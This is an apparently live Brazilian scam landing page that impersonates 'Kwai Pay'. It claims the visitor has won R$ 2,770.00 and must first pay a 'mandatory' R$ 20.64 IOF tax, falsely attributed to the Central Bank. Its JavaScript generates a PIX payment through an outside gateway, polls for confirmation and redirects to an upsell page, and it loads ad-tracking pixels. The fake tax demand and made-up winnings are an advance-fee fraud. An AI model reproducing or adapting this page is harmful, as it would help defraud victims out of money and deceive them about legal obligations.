<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>IOF ‚Äì Kwai</title>
    <meta name="robots" content="max-image-preview:large">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    
    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids async defer></script>
    <script>
        window.kwaiPixelId = "693b89f7bf00e6171b3f8fc1";
        var a = document.createElement("script");
        a.setAttribute("async", "");
        a.setAttribute("defer", "");
        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-kwai.js");
        document.head.appendChild(a);
    </script>
    <script>
        window.tikTokPixelId = "6940cb80540addb695fac48e";
        var a = document.createElement("script");
        a.setAttribute("async", "");
        a.setAttribute("defer", "");
        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
        document.head.appendChild(a);
    </script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>

    <style>
        img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }
        img.wp-smiley, img.emoji { display: inline !important; border: none !important; box-shadow: none !important; height: 1em !important; width: 1em !important; margin: 0 0.07em !important; vertical-align: -0.1em !important; background: none !important; padding: 0 !important; }
        :root { --wp--preset--color--black: #000000; --wp--preset--color--white: #ffffff; --wp--preset--font-size--medium: 20px; --wp--preset--font-size--large: 36px; }
        body { margin: 0; padding: 0; font-family: 'Roboto', sans-serif; background-color: #f0f0f0; }
        /* Adicionei estilos inline cr√≠ticos para reduzir o tamanho do bloco, mantendo o visual original */
        .elementor-element { position: relative; }
        .elementor-widget-container { transition: background .3s, border .3s, border-radius .3s, box-shadow .3s; }
        
        /* Estilos do Modal PIX (Crucial) */
        .pix-modal-overlay { display: none; position: fixed; inset: 0; z-index: 10005; background: rgba(0, 0, 0, 0.6); justify-content: center; align-items: center; padding: 20px; box-sizing: border-box; }
        .pix-modal-overlay.active { display: flex; }
        .pix-modal-container { position: relative; z-index: 10006; max-width: 500px; width: 100%; background: #ffffff; border-radius: 12px; box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3); padding: 30px; box-sizing: border-box; max-height: 90vh; overflow-y: auto; animation: slideUpModal 0.3s ease; }
        @keyframes slideUpModal { from { transform: translateY(50px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
        .pix-modal-close { position: absolute; top: 15px; right: 15px; background: transparent; border: none; font-size: 28px; cursor: pointer; color: #747378; width: 36px; height: 36px; display: flex; align-items: center; justify-content: center; border-radius: 50%; transition: background-color 0.15s ease; z-index: 10; }
        .pix-modal-close:hover { background-color: #f5f5f5; color: #000; }
        .pix-loading { text-align: center; padding: 40px 20px; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .pix-spinner { width: 40px; height: 40px; border: 3px solid #e0e0e0; border-radius: 50%; border-top-color: #003772; animation: spin 0.8s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .pix-payment-content { display: none; }
        .pix-section-title { font-size: 16px; margin-bottom: 20px; color: #000; font-weight: 600; text-align: center; }
        .pix-qrcode-container { text-align: center; margin: 24px 0; display: flex; flex-direction: column; align-items: center; }
        #pix-modal-qrcode { padding: 20px; background: #fff; border: 1px solid #e0e0e0; border-radius: 8px; }
        #pix-modal-qrcode-img { max-width: 200px; height: auto; border-radius: 8px; display: none; }
        .pix-input-group { display: flex; margin-bottom: 16px; width: 100%; }
        #pix-modal-code { flex: 1; padding: 12px 16px; border: 1px solid #e0e0e0; border-right: none; border-radius: 8px 0 0 8px; font-size: 13px; font-family: monospace; height: 41px; }
        .pix-copy-btn { background: #003772; color: white; border: 1px solid #003772; border-left: none; padding: 0 20px; border-radius: 0 8px 8px 0; cursor: pointer; font-weight: 500; font-size: 14px; height: 41px; display: flex; align-items: center; gap: 6px; }
        .pix-payment-info { margin-top: 24px; padding: 16px; background: #f5f5f5; border-radius: 8px; }
        .pix-info-item { display: flex; justify-content: space-between; margin-bottom: 12px; font-size: 14px; }
        .pix-payment-status { margin-top: 20px; padding: 12px; background: #f5f5f5; border-radius: 8px; border-left: 3px solid #007bff; display: none; }
        .pix-error-message { color: #dc2626; text-align: center; padding: 16px; background: #fff5f5; border-radius: 8px; margin-top: 16px; border: 1px solid #fecaca; display: none; font-size: 14px; }
        
        /* Estilos do Elementor (Simplificados para funcionamento) */
        .elementor-heading-title { color: var(--wp--preset--color--black); font-family: "Roboto", Sans-serif; font-size: 24px; font-weight: 600; text-align: center; margin: 0; }
        .btn33 { background: #003772; border-radius: 4px; color: #fff; font-family: 'Inter', sans-serif; font-size: 16px; font-weight: 600; padding: 18px 16px; border: none; text-decoration: none; display: block; text-align: center; margin-top: 20px; cursor: not-allowed; opacity: 0.5; transition: 0.3s; }
        .btn33.enabled { cursor: pointer; opacity: 1; }
        .checkbox-container { display: flex; align-items: center; justify-content: center; margin-top: 20px; }
        .checkbox-container label { font-family: 'Inter', sans-serif; font-size: 12px; color: #535862; display: flex; align-items: center; }
        
        /* Responsividade */
        @media (max-width: 767px) {
            .pix-input-group { flex-direction: column; gap: 8px; }
            #pix-modal-code { border-radius: 8px; border: 1px solid #e0e0e0; width: 100%; box-sizing: border-box; }
            .pix-copy-btn { border-radius: 8px; width: 100%; justify-content: center; }
        }
    </style>
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
</head>

<body class="page-template page-template-elementor_canvas elementor-default elementor-kit-5 elementor-page elementor-page-1379">

    <div class="elementor elementor-1379">
        <div style="max-width: 600px; margin: 0 auto; background: #fff; padding: 20px; min-height: 100vh;">
            
            <div style="text-align: center; margin-bottom: 30px;">
                <svg xmlns="http://www.w3.org/2000/svg" width="160" height="37" viewBox="0 0 160 37" fill="none">
                    <path d="M21.1241 10.7151C21.1241 8.57211 24.1418 6.77896 27.9031 6.77896C31.6643 6.77896 34.682 8.52837 34.682 10.7151C34.682 12.8582 31.6643 14.6076 27.9031 14.6076C24.1418 14.6076 21.1241 12.8582 21.1241 10.7151ZM16.182 10.6277C23.9669 15.1761 33.7636 22.6111 38.7494 26.7222L27.9468 37C20.9054 30.1773 15.0887 24.7979 10.6277 20.9492C13.2518 15.7447 15.1761 12.2459 16.182 10.6277ZM16.0508 4.19858C19.8121 4.19858 23.792 4.37352 27.9468 4.67967C21.0804 7.6974 13.7329 11.7648 5.86052 16.9693C3.7175 15.2199 1.74941 13.8203 0 12.6395C5.81679 9.1844 11.1525 6.38535 16.0508 4.19858ZM40.5863 4.50473L39.7116 10.6277C33.9823 7.12884 27.8156 4.32979 21.1679 2.14303C24.3168 1.04965 26.5473 0.349882 27.9031 0C31.708 0.962175 35.9066 2.49291 40.5863 4.50473ZM27.9468 18.4125C34.4196 13.7329 40.2802 9.9279 46.1844 7.21631C48.8523 8.52837 52.0887 10.3215 55.8499 12.5957C52.0887 15.2199 48.2837 18.1939 44.4787 21.5615C39.2305 20.3369 32.9764 19.156 27.9468 18.4125Z" fill="#ff6900"></path>
                    <text x="60" y="25" font-family="Arial" font-size="20" fill="black" font-weight="bold">Kwai Pay</text>
                </svg>
            </div>

            <div style="text-align: center; margin-bottom: 20px;">
                <i class="fas fa-exclamation-triangle" style="font-size: 40px; color: #fcb900;"></i>
                <h2 class="elementor-heading-title" style="margin-top: 10px;">Imposto (IOF) obrigat√≥rio</h2>
            </div>

            <div style="text-align: center; margin-bottom: 20px;">
                <p>O pagamento do Imposto sobre Opera√ß√µes Financeiras (IOF) √© obrigat√≥rio e exigido pelo <strong>Banco Central do Brasil (Lei n¬∫ 8.894/94)</strong></p>
                <p style="color: red; font-size: 14px;">* √â necess√°rio realizar o pagamento do IOF para receber o valor acumulado.</p>
            </div>

            <div style="background: #f9f9f9; padding: 20px; border-radius: 8px; margin-bottom: 30px;">
                <h3 style="text-align: center; margin-top: 0;">Resumo</h3>
                <hr>
                <div style="display: flex; justify-content: space-between;">
                    <span>Valor ganho</span>
                    <span style="font-weight: bold; color: green;">R$ 2.770,00</span>
                </div>
                <hr>
                <div style="display: flex; justify-content: space-between;">
                    <span>Valor a ser pago (IOF)</span>
                    <span style="font-weight: bold; color: red;">- R$ 20,64</span>
                </div>
                <div style="text-align: right; font-size: 12px; color: #777;">Imposto sobre Opera√ß√µes Financeiras</div>
                <hr>
                <div style="display: flex; justify-content: space-between; font-size: 18px;">
                    <strong>Total a receber</strong>
                    <strong style="color: green;">R$ 2.770,00</strong>
                </div>
                
                <div style="margin-top: 15px; display: flex; align-items: center; gap: 10px; background: #e8f5e9; padding: 10px; border-radius: 4px;">
                    <i class="fas fa-check-circle" style="color: green;"></i>
                    <span style="font-size: 12px;">O pagamento de R$ 2.770,00 ser√° processado via PIX de forma imediata.</span>
                </div>
            </div>

            <div style="text-align: center;">
                <i class="fas fa-exclamation-circle" style="color: #003772; font-size: 30px;"></i>
                <p>Pague com PIX! Os pagamentos s√£o simples, pr√°ticos e realizados em segundos.</p>
                
                <div class="checkbox-container">
                    <label>
                        <input type="checkbox" id="termsCheckbox" onchange="toggleButton()">
                        Concordo com os termos e o pagamento do IOF.
                    </label>
                </div>
                <a id="paymentButton" href="#" class="btn33" onclick="handlePaymentButtonClick(event); return false;" data-enabled="false">Pagar Imposto</a>
            </div>
        </div>
    </div>

    <div id="pix-modal-overlay" class="pix-modal-overlay">
        <div class="pix-modal-container">
            <button class="pix-modal-close" onclick="fecharModalPix()">√ó</button>
            
            <div style="text-align: center; margin-bottom: 20px; font-size: 20px; font-weight: 600; color: #000;">
                Pagamento via PIX
            </div>

            <div id="pix-loading" class="pix-loading">
                <div class="pix-spinner"></div>
                <p>Gerando QRCode para pagamento...</p>
            </div>

            <div id="pix-payment-content" class="pix-payment-content">
                <div class="pix-qrcode-container">
                    <h2 class="pix-section-title">Escaneie o QRCode abaixo</h2>
                    <div id="pix-modal-qrcode"></div>
                    <img id="pix-modal-qrcode-img" alt="QR Code PIX">
                </div>

                <div class="pix-copy-section">
                    <h2 class="pix-section-title" style="font-size: 14px; margin-bottom: 12px">Ou copie o c√≥digo PIX</h2>
                    <div class="pix-input-group">
                        <input type="text" id="pix-modal-code" readonly>
                        <button class="pix-copy-btn" id="pix-copy-btn">
                            <i class="far fa-copy"></i>
                            <span>Copiar</span>
                        </button>
                    </div>
                </div>

                <div class="pix-payment-info">
                    <div class="pix-info-item">
                        <span class="pix-info-label">Valor:</span>
                        <span id="pix-amount">R$ 0,00</span>
                    </div>
                    <div class="pix-info-item">
                        <span class="pix-info-label">V√°lido at√©:</span>
                        <span id="pix-expiration">--/--/---- --:--</span>
                    </div>
                </div>

                <div id="pix-payment-status" class="pix-payment-status">
                    <div class="pix-status-content" style="display: flex; align-items: center; gap: 10px;">
                        <div class="pix-status-icon"><i class="fas fa-spinner fa-spin"></i></div>
                        <div class="pix-status-text">
                            <p class="pix-status-title" style="margin:0; font-weight:bold;">Aguardando confirma√ß√£o...</p>
                            <p class="pix-status-subtitle" id="pix-status-subtitle" style="margin:0; font-size:12px;">Verificando status</p>
                        </div>
                    </div>
                </div>
            </div>

            <div id="pix-error-message" class="pix-error-message"></div>
        </div>
    </div>

    <script>
        // ==========================================
        // CONFIGURA√á√ÉO DA API
        // ==========================================
        const API_URL = "https://kwwretiradasofc.online/api/gateway/index.php"; 
        // ==========================================

        // Vari√°veis globais
        let pixPaymentId = null;
        let pixCheckPaymentInterval = null;
        let paymentConfirmed = false;

        // Fun√ß√£o de Pre√ßo (Valor fixo conforme sua oferta)
        function getVariantPrice() {
            return 20.64; 
        }

        // Fun√ß√£o para liberar o bot√£o apenas quando checkbox estiver marcado
        function toggleButton() {
            const checkbox = document.getElementById('termsCheckbox');
            const button = document.getElementById('paymentButton');
            if (checkbox.checked) {
                button.classList.add('enabled');
                button.setAttribute('data-enabled', 'true');
            } else {
                button.classList.remove('enabled');
                button.setAttribute('data-enabled', 'false');
            }
        }

        function handlePaymentButtonClick(event) {
            const button = document.getElementById('paymentButton');
            const isEnabled = button.getAttribute('data-enabled') === 'true';

            if (!isEnabled) {
                event.preventDefault();
                alert("Voc√™ precisa aceitar os termos antes de prosseguir.");
                return false;
            } else {
                event.preventDefault();
                abrirModalPix();
                return false;
            }
        }

        // ==========================================
        // FUN√á√ïES DO MODAL
        // ==========================================
        function abrirModalPix() {
            console.log("Abrindo modal...");
            const modal = document.getElementById("pix-modal-overlay");
            if(modal) {
                modal.classList.add("active");
                document.body.style.overflow = "hidden";
                
                // Reset UI
                document.getElementById("pix-loading").style.display = "flex";
                document.getElementById("pix-payment-content").style.display = "none";
                const errDiv = document.getElementById("pix-error-message");
                if(errDiv) errDiv.style.display = "none";
                const statusDiv = document.getElementById("pix-payment-status");
                if(statusDiv) statusDiv.style.display = "none";

                tryGeneratePix();
            }
        }

        function fecharModalPix() {
            const modal = document.getElementById("pix-modal-overlay");
            if(modal) modal.classList.remove("active");
            document.body.style.overflow = "";

            if (pixCheckPaymentInterval) {
                clearInterval(pixCheckPaymentInterval);
                pixCheckPaymentInterval = null;
            }
            paymentConfirmed = false;
        }

        // ==========================================
        // L√ìGICA DO PIX (Integra√ß√£o com PHP)
        // ==========================================
        function tryGeneratePix() {
            const cliente = getClienteData();
            const valor = getVariantPrice();
            const utmParams = getUtmParams();
            const utmString = new URLSearchParams(utmParams).toString();

            const params = new URLSearchParams();
            params.append('acao', 'criar');
            params.append('valor', valor);
            params.append('nome', cliente.nome);
            params.append('email', cliente.email);
            params.append('cpf', cliente.documento);
            params.append('telefone', cliente.telefone);
            params.append('utm', utmString);

            console.log("üöÄ Enviando requisi√ß√£o para:", API_URL);

            fetch(API_URL, {
                method: "POST",
                headers: { "Content-Type": "application/x-www-form-urlencoded" },
                body: params.toString(),
            })
            .then(response => {
                if (!response.ok) return response.text().then(text => { throw new Error(text) });
                return response.json();
            })
            .then(data => {
                // A API PHP retorna: { success: true, pixCode: "...", payment_id: "...", status: "pending" }
                if (data.pixCode && data.payment_id) {
                    handlePixSuccess(data);
                } else {
                    showError("Erro na resposta da API: " + JSON.stringify(data));
                }
            })
            .catch(error => {
                console.error("Erro cr√≠tico:", error);
                showError("Erro de comunica√ß√£o: " + error.message);
            });
        }

        function handlePixSuccess(data) {
            console.log("‚úÖ Sucesso:", data);
            pixPaymentId = data.payment_id;

            document.getElementById("pix-loading").style.display = "none";
            document.getElementById("pix-payment-content").style.display = "block";

            const valor = getVariantPrice();
            document.getElementById("pix-amount").textContent = valor.toLocaleString("pt-BR", { style: "currency", currency: "BRL" });
            
            // Validade (Ex: 2 dias)
            const expirationDate = new Date(Date.now() + 2 * 24 * 60 * 60 * 1000);
            const elExpiration = document.getElementById("pix-expiration");
            if(elExpiration) {
                elExpiration.textContent = expirationDate.toLocaleString("pt-BR");
            }

            // C√≥digo PIX
            let pixQrCode = data.pixCode;
            const pixModalCode = document.getElementById("pix-modal-code");
            const qrcodeImg = document.getElementById("pix-modal-qrcode-img");
            const qrcodeElement = document.getElementById("pix-modal-qrcode");

            pixModalCode.value = pixQrCode;

            // Gera o QRCode visual
            qrcodeElement.innerHTML = ""; // Limpa anterior
            
            // Se o pixCode for uma URL direta de imagem (o que √© raro, geralmente √© Copia e Cola)
            if (pixQrCode.startsWith("http")) {
                qrcodeImg.src = pixQrCode;
                qrcodeImg.style.display = "block";
                qrcodeElement.style.display = "none";
            } else {
                // Gera o QRCode Canvas
                if (typeof QRCode !== "undefined") {
                    new QRCode(qrcodeElement, {
                        text: pixQrCode,
                        width: 200,
                        height: 200,
                        colorDark : "#000000",
                        colorLight : "#ffffff",
                        correctLevel : QRCode.CorrectLevel.M
                    });
                    qrcodeImg.style.display = "none";
                    qrcodeElement.style.display = "flex";
                    qrcodeElement.style.justifyContent = "center";
                } else {
                    // Fallback se a lib QRCode n√£o carregar
                    qrcodeImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixQrCode)}`;
                    qrcodeImg.style.display = "block";
                    qrcodeElement.style.display = "none";
                }
            }

            setupCopyButton();
            iniciarVerificacaoPagamento(pixPaymentId);
        }

        function iniciarVerificacaoPagamento(idPagamento) {
            if(pixCheckPaymentInterval) clearInterval(pixCheckPaymentInterval);
            
            const statusSubtitle = document.getElementById("pix-status-subtitle");
            const statusDiv = document.getElementById("pix-payment-status");
            if(statusDiv) statusDiv.style.display = "block";

            // Loop de verifica√ß√£o a cada 5 segundos
            pixCheckPaymentInterval = setInterval(() => {
                if (paymentConfirmed) return;

                fetch(`${API_URL}?acao=verificar&payment_id=${idPagamento}`)
                .then(r => r.json())
                .then(data => {
                    console.log("Status Check:", data);
                    // A API PHP retorna 'approved' se estiver pago
                    if (['approved', 'paid', 'completed'].includes(data.status)) {
                        handlePaymentConfirmed(idPagamento);
                    } else if (statusSubtitle) {
                        const now = new Date().toLocaleTimeString("pt-BR");
                        statusSubtitle.textContent = `Aguardando... (${now})`;
                    }
                })
                .catch(e => console.warn("Polling error", e));
            }, 5000);
        }

        function handlePaymentConfirmed(id) {
            if (paymentConfirmed) return;
            paymentConfirmed = true;
            clearInterval(pixCheckPaymentInterval);

            const statusDiv = document.getElementById("pix-payment-status");
            if(statusDiv) {
                statusDiv.innerHTML = `
                    <div style="text-align:center; color:#28a745; margin-top:10px;">
                        <i class="fas fa-check-circle" style="font-size:40px;"></i>
                        <p style="font-weight:bold; font-size:18px; margin-top:5px;">Pagamento Confirmado!</p>
                        <p>Redirecionando...</p>
                    </div>
                `;
            }

            // Redirecionamento
            const utmParams = getUtmParams();
            const utmString = new URLSearchParams(utmParams).toString();
            
            // Aguarda 1.5s e redireciona para a p√°gina de upsell (definida no seu PHP) ou aqui
            setTimeout(() => {
                window.location.href = "../up2/index.html?" + utmString;
            }, 1500);
        }

        function showError(msg) {
            document.getElementById("pix-loading").style.display = "none";
            const err = document.getElementById("pix-error-message");
            if(err) {
                err.innerHTML = msg;
                err.style.display = "block";
            }
        }

        function setupCopyButton() {
            const btn = document.getElementById("pix-copy-btn");
            if(!btn) return;
            const newBtn = btn.cloneNode(true);
            btn.parentNode.replaceChild(newBtn, btn);
            newBtn.addEventListener("click", () => {
                const input = document.getElementById("pix-modal-code");
                input.select();
                document.execCommand("copy");
                newBtn.innerHTML = '<i class="fas fa-check"></i> Copiado!';
                setTimeout(() => newBtn.innerHTML = '<i class="far fa-copy"></i> Copiar', 2000);
            });
        }

        // --- Helpers de Dados ---
        function getUtmParams() {
            const p = new URLSearchParams(window.location.search);
            const r = {};
            ["utm_source","utm_medium","utm_campaign","utm_content","utm_term"].forEach(k => {
                if(p.has(k)) r[k] = p.get(k);
            });
            return r;
        }

        function getClienteData() {
            // Se voc√™ tiver inputs de nome/email na p√°gina anterior, pode pegar do localStorage
            // Aqui estou usando dados de exemplo para gerar o PIX
            return {
                nome: "Cliente Visitante", 
                email: "visitante@email.com", 
                documento: "12345678900", // CPF ser√° validado/gerado pelo PHP se inv√°lido
                telefone: "11999999999"
            };
        }
        
        // Inicializa√ß√£o
        document.addEventListener("DOMContentLoaded", function() {
            const overlay = document.getElementById("pix-modal-overlay");
            if (overlay) overlay.addEventListener("click", (e) => {
                if (e.target === overlay) fecharModalPix();
            });
        });
    </script>
</body>
</html>
